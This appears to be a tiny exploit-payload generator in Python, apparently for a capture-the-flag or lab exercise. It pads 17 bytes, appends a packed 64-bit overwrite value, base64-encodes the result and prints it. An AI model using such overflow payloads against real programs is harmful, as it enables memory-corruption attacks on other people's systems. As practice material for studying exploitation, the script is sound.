
import sys
import struct
import base64

buf = b'rrrrrrrrrrrrrrrrr'
buf += struct.pack('<Q', 6254032637578768192)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
